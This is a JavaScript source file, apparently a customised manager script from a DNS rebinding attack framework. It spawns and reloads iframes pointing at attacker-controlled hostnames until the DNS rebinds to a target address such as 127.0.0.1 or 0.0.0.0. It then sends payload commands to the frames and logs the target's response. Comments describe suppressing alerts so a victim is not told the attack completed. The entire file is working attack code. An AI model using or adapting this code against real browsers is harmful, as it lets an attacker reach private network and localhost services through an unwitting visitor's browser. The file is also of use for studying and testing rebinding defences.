/* Attack Management */

function getAttackConfig() {
  return fetch("/attack-config.json")
    .then(r => r.text())
    .then(d => JSON.parse(d));
}

const Payload = () => {
  let name = null;
  let ports = [];
  return {
    getName() {
      return name;
    },
    getPorts() {
      return ports;
    },
    init(n, p) {
      name = n;
      ports = p;
    }
  };
};

const Configuration = () => {
  let type = null; // determine whether we run a manager driven or automated attack
  let delayDOMLoad = null;
  let alertSuccess = null;
  let hideActivity = null;

  let attackPayloads = [];
  let attackHostDomain = null;
  let attackHostIPAddress = null;
  let targetHostIPAddress = null;
  let dummyPort = null;
  let indexToken = null;
  let attackPayload = null;
  let interval = null;
  let rebindingStrategy = null;
  let flushDns = null;
  let wsProxyPort = null;
  let targetPort = null;

  let rebindingSuccessFn = null;

  // Obtains URL query parameters value based on name
  // Uses https://stackoverflow.com/questions/901115/how-can-i-get-query-string-values-in-javascript
  //as URLSearchParams API not supported by all browsers
  // Returns `null` if  URL parameter `name` is not present, other its value.
  function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    let regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
      results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return "";
    return decodeURIComponent(results[2].replace(/\+/g, " "));
  }

  return {
    init(rebindingSuccessCb) {
      // Set URL parameter `delaydomload` to some value
      // to delay the browser DOM load event
      // and prevent premature exit of headless browsers
      delayDOMLoad = getParameterByName("delaydomload");
      // Set URL parameter `alertsuccess` to "false"
      // to not present an alert box upon a successful rebinding attack.
      // This may be useful for:
      // * not informing a victim that an attack completed
      // * or to freeze a headless browser forever (unless performing a DoS attack).
      alertSuccess = getParameterByName("alertsuccess");
      type = "manager";
      rebindingSuccessFn = rebindingSuccessCb;
    },
    getType() {
      return type;
    },
    getDelayDOMLoad() {
      return delayDOMLoad;
    },
    getAlertSuccess() {
      return alertSuccess;
    },
    getHideActivity() {
      return hideActivity;
    },
    getAttackPayloads() {
      return attackPayloads;
    },
    getAttackHostDomain() {
      return attackHostDomain;
    },
    getAttackHostIPAddress() {
      return attackHostIPAddress;
    },
    getTargetHostIPAddress() {
      return targetHostIPAddress;
    },
    getTargetPort() {
      return targetPort;
    },
    getDummyPort() {
      return dummyPort;
    },
    getIndexToken() {
      return indexToken;
    },
    getAttackPayload() {
      return attackPayload;
    },
    setAttackPayload(attackPayloadName) {
      attackPayload = attackPayloadName;
    },
    getInterval() {
      return interval;
    },
    setInterval(i) {
      interval = i;
    },
    getWsProxyPort() {
      return wsProxyPort;
    },
    setWsProxyPort(port) {
      wsProxyPort = port;
    },
    getRebindingStrategy() {
      return rebindingStrategy;
    },
    getFlushDns() {
      return flushDns;
    },
    setFlushDns(boolean) {
      flushDns = boolean;
    },
    getRebindingSuccessFn() {
      return rebindingSuccessFn;
    },
    setManually(configObject) {
      attackHostIPAddress = configObject.attackHostIPAddress;
      attackHostDomain = configObject.attackHostDomain;
      rebindingStrategy = configObject.rebindingStrategy;
      flushDns = configObject.flushDns;
      interval = configObject.interval;
      wsProxyPort = configObject.wsProxyPort;
      indexToken = configObject.indexToken;
      attackPayload = configObject.attackPayload;
      hideActivity = configObject.hideActivity;
      delayDOMLoad = configObject.delayDOMLoad;
      rebindingSuccessFn = configObject.rebindingSuccessFn;
    }
  };
};

const Frame = (id, url) => {
  let fmid = id;
  let fmurl = url;
  let timer = null;
  let errorCount = 0;
  let interval = null;
  return {
    getId() {
      return fmid;
    },
    setURL(val) {
      return (url = val);
    },
    getURL() {
      return fmurl;
    },
    getTimer() {
      return timer;
    },
    setTimer(val) {
      return (timer = val);
    },
    getInterval() {
      return interval;
    },
    setInterval(val) {
      interval = val;
    },
    getErrorCount() {
      return errorCount;
    },
    incrementErrorCount() {
      return (errorCount += 1);
    }
  };
};

const FrameManager = () => {
  let nextFrameIdVal = 0;
  let frames = new Map();
  let origins = new Map();
  const nextFrameId = () => {
    return nextFrameIdVal++;
  };
  const origin = url => {
    //Does not work in IE11.
    //const u = new URL(url);
    // Workaround:
    let u = document.createElement("a");
    let id = Math.random().toString();
    u.setAttribute("href", url);
    u.setAttribute("id", id);
    const o = u.port
      ? `${u.protocol}//${u.hostname}:${u.port}`
      : `${u.protocol}//${u.hostname}`;
    u.remove();
    return o;
  };
  return {
    addFrame(url) {
      const frameId = `frame-${nextFrameId().toString()}`;
      frames.set(frameId, Frame(frameId, url));
      origins.set(origin(url), frameId);
      return frameId;
    },
    removeFrame(frameId) {
      const url = frames.get(frameId).getURL();
      origins.delete(origin(url));
      return frames.delete(frameId);
    },
    updateFrame(frameId, url) {
      const oldurl = frames.get(frameId).getURL();
      const neworigin = origin(url);
      origins.delete(origin(oldurl));
      origins.set(neworigin, frameId);
      frames.set(frameId, Frame(frameId, url));
    },
    frames() {
      return frames;
    },
    lastFrameId() {
      return nextFrameIdVal === 0 ? null : `frame-${nextFrameIdVal - 1}`;
    },
    frame(id) {
      return frames.get(id);
    },
    getFrameOrigin(origin) {
      return origins.get(origin);
    }
  };
};

// Requests Singularity to instantiate a new HTTP server on specified port.
function requestPort(port) {
  return putData("/servers", {
    Port: String(port)
  }).catch(error => console.error(error));
}

function putData(url, data) {
  // Default options are marked with *
  return fetch(url, {
    body: JSON.stringify(data),
    method: "PUT"
  }).then(response => response.json());
}

const App = () => {
  let configuration = null;
  let fm = null;
  let hosturl = "http://s-%1-%2-%3-%4-e.%5:%6/%7";

  function generateAttackUrl(
    targetHostIPAddress,
    targetPort,
    forceDnsRebindingStrategyName
  ) {
    return hosturl
      .replace("%1", configuration.getAttackHostIPAddress())
      .replace("%2", targetHostIPAddress) // replace(/-/g, '--'))
      .replace("%3", Math.floor(Math.random() * 2 ** 32))
      .replace(
        "%4",
        forceDnsRebindingStrategyName === null
          ? configuration.getRebindingStrategy()
          : forceDnsRebindingStrategyName
      )
      .replace("%5", configuration.getAttackHostDomain())
      .replace("%6", targetPort)
      .replace("%7", "soopayload.html" + "?rnd=" + Math.random());
  }

  return {
    getFrameManager() {
      return fm;
    },
    getConfiguration() {
      return configuration;
    },

    attackTarget(targetHostIPAddress, targetPort, optimizeForSpeed) {
      let self = this;

      let payload = app.getConfiguration().getRebindingStrategy();
      let interval = self.getConfiguration().getInterval();

      if (optimizeForSpeed === true) {
        // let's try some rebinding strategy optimizations
        // Rebinding in 3s!
        if (targetHostIPAddress === "0.0.0.0" && isUnixy() === true) {
          payload = "ma";
          interval = "1";
        } else if (targetHostIPAddress === "127.0.0.1" && isUnixy() === false) {
          payload = "ma";
          interval = "1";
        }
      }

      let fid = self
        .getFrameManager()
        .addFrame(generateAttackUrl(targetHostIPAddress, targetPort, payload));
      self
        .getFrameManager()
        .frame(fid)
        .setInterval(interval);

      self.addFrameToDOM(self.getFrameManager().frame(fid));
      self
        .getFrameManager()
        .frame(fid)
        .setTimer(
          setInterval(() => {
            self.reloadAttackFrame(self.getFrameManager().frame(fid));
          }, parseInt(interval) * 1000)
        );
    },
    init(rebindingSuccessCb) {
      let self = this;

      fm = FrameManager();

      // Configuration
      configuration = Configuration();
      // Initialize defaults settings and settings passed from URL query.
      configuration.init(rebindingSuccessCb);

      // Message handler between Manager and attack frames
      window.addEventListener("message", self.receiveMessage, false);

      // Singularity HTTP server settings initialization
      document.addEventListener("DOMContentLoaded", () => {
        self.begin();
      });
    },
    addFrameToDOM(frame) {
      let f = document.createElement("iframe");
      f.src = frame.getURL();
      f.setAttribute("id", frame.getId());
      //f.setAttribute('style', "display: none");
      document.getElementById("attackframes").appendChild(f);
    },

    // Set src of attackframe
    // thus loading the attack payload before rebinding
    // and accessing the target after rebinding.
    reloadAttackFrame(frame) {
      document.getElementById(frame.getId()).src = frame.getURL();
    },

    // communication handler between manager and attack iframe.
    receiveMessage(msg) {
      console.log("Message received from: ", msg.origin, msg.data.status);

      const fid = fm.getFrameOrigin(msg.origin);
      // If we don't have a frame ID for this message origin, dismiss message.
      if (fid === undefined) {
        return;
      }

      if (msg.data.status === "start") {
        console.log(`Iframe reports that attack has started: ${msg.origin}`);
        clearInterval(fm.frame(fid).getTimer());
        msg.source.postMessage(
          {
            cmd: "payload",
            param: configuration.getAttackPayload()
          },
          "*"
        );
        msg.source.postMessage(
          {
            cmd: "interval",
            param: fm.frame(fid).getInterval()
              ? fm.frame(fid).getInterval()
              : configuration.getInterval()
          },
          "*"
        );
        msg.source.postMessage(
          {
            cmd: "wsproxyport",
            param: configuration.getWsProxyPort()
          },
          "*"
        );
        msg.source.postMessage(
          {
            cmd: "indextoken",
            param: configuration.getIndexToken()
          },
          "*"
        );
        msg.source.postMessage(
          {
            cmd: "flushdns",
            param: {
              hostname: window.location.hostname,
              flushDns: configuration.getFlushDns()
            }
          },
          "*"
        );
        configuration.setFlushDns(false); // so it run only once in autoattack.
        msg.source.postMessage(
          {
            cmd: "start",
            param: null
          },
          "*"
        );
      }
      if (msg.data.status === "success") {
        configuration.getRebindingSuccessFn()(msg);
        msg.source.postMessage(
          {
            cmd: "stop"
          },
          "*"
        );
      }

      if (msg.data.status === "requiresHttpAuthentication") {
        document.getElementById(fid).contentWindow.postMessage(
          {
            cmd: "stop"
          },
          "*"
        );
        console.log(
          `This resource requires HTTP authentication. Cannot access without user noticing: ${msg.origin}`
        );
      }

      // Possibly a firewalled or closed port. Possibly a non-HTTP service.
      if (msg.data.status === "error") {
        fm.frame(fid).incrementErrorCount();
        console.log(`error: ${msg.origin}`);

        if (fm.frame(fid).getErrorCount() === 5) {
          document.getElementById(fid).contentWindow.postMessage(
            {
              cmd: "stop"
            },
            "*"
          );
          console.log(`Too many errors, stopping: ${msg.origin}`);
        }
      }
    },
    // Starts attack
    begin() {
      let self = this;

       getAttackConfig().then(config => {
         configuration.setInterval(config.interval);
         configuration.setFlushDns(config.flushDns);
         configuration.setAttackPayload(config.attackPayload);
         configuration.setWsProxyPort(config.wsProxyPort);

         requestPort(config.targetPort).then(() => {
             let fid = fm.addFrame(
               hosturl
                 .replace("%1", config.attackHostIPAddress)
                 .replace("%2", config.targetHostIPAddress)
                 .replace("%3", Math.floor(Math.random() * 2 ** 32))
                 .replace("%4", config.rebindingStrategy)
                 .replace("%5", config.attackHostDomain)
                 .replace("%6", config.targetPort)
                 //.replace("%7", document.getElementById("payloads").value) + "?rnd=" + Math.random());
                 .replace("%7", "soopayload.html") +
                 "?rnd=" +
                 Math.random()
             );
             self.addFrameToDOM(fm.frame(fid));
             fm.frame(fid).setTimer(
               setInterval(() => {
                 self.reloadAttackFrame(fm.frame(fid));
               }, config.interval * 1000)
             );
         })
      });
    }
  };
};

function isUnixy() {
  return !navigator.platform.includes("Win");
}

function rebindingSuccessCb(msg) {
  console.log(
    `Iframe reports attack successful for ${msg.origin}\n${msg.data.response}`
  );
}

// Start
const app = App();
app.init(rebindingSuccessCb);
